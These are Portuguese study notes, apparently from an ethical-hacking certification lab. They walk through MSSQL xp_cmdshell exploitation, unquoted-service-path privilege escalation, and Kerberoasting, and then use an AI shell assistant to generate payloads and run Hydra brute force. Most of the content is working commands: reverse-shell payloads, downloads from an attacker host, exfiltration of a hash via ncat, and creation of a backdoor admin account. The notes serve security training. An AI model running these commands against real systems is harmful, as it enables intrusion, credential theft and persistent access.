# Verificar se xp_cmdshell está habilitado
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name='xp_cmdshell';
#   Retorno esperado: IsConfigured = 1
#   Significa que o xp_cmdshell está ativado, e permite execução de comandos no SO pelo SQL.

# Iniciar Metasploit
msfconsole
#   Esperar carregar os módulos do framework.

# Configurar módulo de exploit no Metasploit
use exploit/windows/mssql/mssql_payload
set RHOST 10.10.1.30
set USERNAME SQL_srv
set PASSWORD batman
set DATABASE master
# Explicações:
#   use exploit/...	Escolhe exploit específico para MSSQL + xp_cmdshell
#   set RHOST	Define o alvo
#   set USERNAME	Define o nome do usuário MSSQL
#   set PASSWORD	Define a senha descoberta (batman)
#   set DATABASE	Define banco (default = master)

# Executar o exploit
exploit
#   Resultado: Sessão do Meterpreter aberta, indicando execução remota com sucesso.

# Verificar usuário atual via shell remota
shell
whoami
#   Retorno: sqlexpress
#   Indica que a execução de comandos está sob contexto do serviço SQL Server (geralmente com permissões elevadas ou SYSTEM).

# Dica Final
#   Para hardening:
#       Desabilitar xp_cmdshell
#       Restringir acesso ao SQL Server
#       Monitorar logins incomuns
#       Usar autenticação forte


########
# TASK 6: Perform Privilege Escalation
########

# Objetivo
#   Enumerar e explorar vulnerabilidades locais de privilege escalation no Windows Server 2019.
#   Utilizar a ferramenta WinPEAS para detectar falhas como caminhos de serviço sem aspas (Unquoted Service Path).
#   Gerar e injetar payload para obter shell reverso com privilégios elevados (NT AUTHORITY\SYSTEM).

# Ferramentas Usadas
#   WinPEASx64.exe	            Enumeração local de falhas de privilege escalation no Windows
#   msfvenom	                Geração de payload malicioso (reverse shell)
#   python3 -m http.server	    Servidor HTTP para envio do payload
#   wget	                    Baixar arquivos da máquina atacante
#   nc (Netcat)	                Listener para capturar shell reversa

# Fluxo de Ataque (Visão Geral)
#   Baixar e executar WinPEAS na máquina Windows.
#   Detectar vulnerabilidade de Unquoted Service Path.
#   Criar payload .exe com msfvenom.
#   Substituir binário vulnerável (file.exe).
#   Reiniciar máquina para disparar o payload.
#   Capturar shell via Netcat com privilégios de SYSTEM.

# Acessar o diretório de Downloads da máquina Windows (via RDP ou shell)
cd C:\Users\Public\Downloads
powershell
#   Objetivo: local para salvar e executar o winPEASx64.exe.

# Servir o WinPEAS pela máquina atacante
sudo su
cd /root/ADtools
python3 -m http.server
#   Isso cria um servidor HTTP simples (porta 8000) para transferir arquivos.

# Baixar o winPEASx64.exe na máquina Windows
wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
.\winpeas.exe
#   Esperar pela saída de execução.
#   WinPEAS lista várias informações sensíveis, incluindo:
#   Detectado:
#       Unquoted Service Path: C:\Program Files\CEH Services\file.exe

# Explicação – Vulnerabilidade Unquoted Service Path
#   Um caminho de serviço sem aspas e com espaços permite que o Windows busque o executável em partes do caminho, como:
C:\Program.exe
C:\Program Files\CEH.exe
C:\Program Files\CEH Services\file.exe
#   Se o atacante conseguir escrever em um desses caminhos, pode inserir um binário malicioso que será executado com privilégios SYSTEM ao reiniciar o sistema.

# Criar Payload com msfvenom
msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
#   Gera arquivo file.exe com um shell reverso para IP da máquina atacante.

# Substituir o binário vulnerável na máquina Windows
cd "C:\Program Files\CEH Services"
move file.exe file.bak
wget http://10.10.1.13:8000/file.exe -o file.exe
#   Salvamos o original como backup (file.bak)
#   Enviamos o payload como novo file.exe

# Abrir listener no Kali/Parrot
nc -nvlp 8888
#   Escuta ativa aguardando conexão reversa da vítima.

# Reiniciar a máquina vítima (Windows Server 2019)
#   Ação feita via botão Reset/Reboot na interface da VM (ex: VirtualBox ou VMWare).
#   Login com:
#       Usuário: SQL_srv
#       Senha: batman
#   O serviço vulnerável será executado no boot, chamando o novo file.exe com payload.

# Shell capturado com privilégios elevados
#   Verifique:
whoami
#   Retorno esperado:
nt authority\system
#   PRIV ESCALATION BEM-SUCEDIDA!

# Dica de Persistência
#   Após obter acesso SYSTEM, o atacante pode:
#   Criar novo usuário administrador:
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
#   Implantar backdoor persistente (agendamento de tarefa, serviço, etc).
#   Exfiltrar arquivos confidenciais ou credenciais armazenadas.

# Ações
# Você executa com sucesso uma cadeia completa de ataque local, incluindo:
#   Enumeração com WinPEAS
#   Análise de falhas de execução de serviços
#   Criação e entrega de payloads
#   Escalada de privilégio até SYSTEM


########
# TASK 7: Perform Kerberoasting Attack
########



# Objetivo
#   Extrair e quebrar hashes de tickets Kerberos (TGS) de contas com SPNs (Service Principal Names) para obter senhas em texto claro — especialmente contas privilegiadas, como DC-Admin.

# Ferramentas Usadas
#   Rubeus.exe	    Extração de hashes Kerberos TGS vinculados a contas com SPN (kerberoasting)
#   ncat.exe	    Envio de arquivos via rede (usado para exfiltrar o hash.txt)
#   hashcat	        Quebra offline de hashes (TGS) usando força bruta com wordlist
#   rockyou.txt	    Wordlist comum com milhões de senhas conhecidas (dicionário)

# Conceito: O que é Kerberoasting?
#       Explora o funcionamento do Kerberos no AD.
#       Quando um usuário solicita acesso a um serviço identificado por um SPN, o KDC retorna um TGS (Ticket Granting Service) criptografado com a senha do serviço.
#       Atacantes com permissão de leitura no AD (usuários comuns) podem solicitar esse TGS.
#       O TGS pode ser crackeado offline (por força bruta) para recuperar a senha do serviço, especialmente se fraca.
#   Ideal contra contas de serviço com privilégios elevados e senhas fracas.

# Fluxo do Ataque
#   Baixar Rubeus e ncat na máquina vítima.
#   Executar kerberoast e salvar hash no disco.
#   Exfiltrar hash.txt via netcat.
#   Crackear offline com Hashcat.
#   Obter senha do DC-Admin.

# Lançar o PowerShell dentro do shell Netcat
powershell

# Navegar até pasta de downloads
cd ../..
cd Users\Public\Downloads
#   Ponto comum e acessível para leitura/gravação por usuários padrão.

# Baixar Rubeus e ncat (máquina atacante precisa estar com HTTP server ativo)
wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe
wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
#   Ambos serão executados localmente na máquina Windows para extrair e transmitir os dados.

# Executar Kerberoasting e salvar hashes
.\rubeus.exe kerberoast /outfile:hash.txt
#   Extrai hashes TGS de contas com SPN visível.
#   Exemplo de resultado:
#       $krb5tgs$23$*DC-Admin$...

# Exfiltrar hash.txt usando ncat
#   Atacante escutando:
sudo su
nc -lvp 9999 > hash.txt
#   Vítima enviando:
.\ncat.exe -w 3 10.10.1.13 9999 < hash.txt
#   -w 3: timeout de 3 segundos após o envio.

# Crackear a hash com Hashcat
hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
#   Explicando a Sintaxe:
#       -m 13100	    Tipo de hash Kerberos TGS etype 23 (RC4-HMAC)
#       --force	        Força execução mesmo com alertas de GPU/drivers
#       -a 0	        Modo de ataque: dicionário direto (cada linha testada como senha)
#       hash.txt	    Arquivo contendo os hashes Kerberos extraídos
#       rockyou.txt	    Wordlist para testar contra os hashes
#   Resultado Esperado
#       Após processamento do Hashcat:
#           $krb5tgs$23$... : advanced!
#   A senha advanced! da conta DC-Admin foi descoberta com sucesso!

# Potencial Pós-Ataque
#   Como DC-Admin:
#       Possivelmente é membro de Domain Admins.
#       Pode ser usado para:
#           Dump de hashes do AD (ntds.dit + SYSTEM);
#           Golden Ticket;
#           DCSync attacks;
#           Implantação de backdoors/persistência;
#           Movimentação lateral com psexec, wmiexec etc.

# Conclusão Técnica
#   Você realizou com sucesso um dos ataques mais letais e silenciosos em ambientes Active Directory:
#   Sem gerar muito ruído de rede (requisita ticket e trabalha offline).
#   Altamente eficaz contra senhas fracas de contas privilegiadas.
#   Entrega acesso persistente e dominante ao domínio.


###############
# MOD 6 - Lab 6: Perform System Hacking using AI
###############


########
# TASK 1: Perform System Hacking using ShellGPT 
########

# Objetivo
#   Demonstrar como usar ShellGPT (sgpt) — um assistente de shell baseado em IA — para automatizar e acelerar tarefas de hacking, como:
#       Geração de payloads
#       Inicialização de listeners
#       Ataques de força bruta com Hydra
#       Esteganografia com Steghide
#       Extração de dados ocultos
#       Tudo isso usando prompts inteligentes de IA.

# Tornar-se root no terminal do Parrot Security
sudo su
#   Senha: toor

# Iniciar o ShellGPT
bash sgpt.sh
#   Isso inicializa o ShellGPT e pede sua chave de ativação AI, que pode ser obtida pelo PDF do módulo de setup.

# Criar um Payload TCP com msfvenom
sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444"
#   No prompt, digite E e pressione Enter para executar o comando sugerido pela IA.
#   Resultado:
#       Arquivo payload.exe gerado com o seguinte comando aproximado:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > payload.exe

# Verificar o payload criado. Confirma que o arquivo payload.exe foi gerado no diretório atual.
ls 

# Iniciar um listener com msfconsole
sgpt --shell "Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444"
#   Pressione E para executar.
#   Isso abre o Metasploit e inicia um handler como:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.1.13
set LPORT 444
exploit
#   Não será estabelecida sessão, pois o payload não é executado na máquina-alvo neste lab.

# Sair do msfconsole
exit

# Ataque de Força Bruta SSH com Hydra
sgpt --shell "Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt files available at location /home/attacker/Wordlist"
#   Pressione E para executar.
#   Comando gerado provavelmente será:
hydra -L /home/attacker/Wordlist/username.txt -P /home/attacker/Wordlist/password.txt ssh://10.10.1.9
#   Resultado esperado: credenciais usuário/senha válidas são reveladas.

# Esteganografia com Steghide – Ocultar texto em imagem
sgpt --shell "Perform stegnography using steghide to hide text 'My swiss account number is 232343435211113' in cover.jpg image file with password as '1234'"
#   Pressione E para executar.
#   O comando gerado deve ser:
echo "My swiss account number is 232343435211113" > secret.txt
steghide embed -cf cover.jpg -ef secret.txt -p 1234
#  Isso oculta o texto no arquivo cover.jpg.

# Abrir imagem cover.jpg
xdg-open /home/attacker/cover.jpg
#   Confirma visualmente que a imagem não aparenta ter sido alterada.

# Extrair o conteúdo oculto com Steghide
sgpt --shell "Use steghide to extract hidden text in cover.jpg"
#   Pressione E para executar.
#   O comando será algo como:
steghide extract -sf cover.jpg
#   No prompt:
#       Digite: 1234 (senha)
#       Digite: y para confirmar
#   Um arquivo secret.txt será criado com o conteúdo extraído.

# Abrir o conteúdo extraído
pluma secret.txt
# My swiss account number is 232343435211113